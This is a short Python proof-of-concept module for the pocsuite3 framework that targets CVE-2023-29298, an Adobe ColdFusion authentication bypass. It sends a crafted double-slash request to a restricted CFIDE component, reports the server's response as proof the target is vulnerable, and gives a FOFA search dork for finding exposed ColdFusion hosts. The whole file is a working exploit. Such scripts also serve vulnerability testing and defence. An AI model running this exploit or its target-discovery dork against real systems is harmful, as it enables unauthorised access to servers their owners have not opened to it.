from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin

minimum_version_required('1.9.11')


class POC(POCBase):
    vulID = 'CVE-2023-29298'
    appName = '-'
    appVersion = '-'
    name = "Adobe ColdFusion认证绕过漏洞（CVE-2023-29298)"
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'fofa': 'app="Adobe-ColdFusion"'}

    def _exploit(self):
        url = self.url + '//CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx'
        res = requests.get(url, verify=False)
        if res.status_code == 200:
            #logger.info(res.text)
            return res.text

    def _verify(self):
        result = {}
        res1 = self._exploit()
        if res1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['res'] = res1
        return self.parse_output(result)


register_poc(POC)
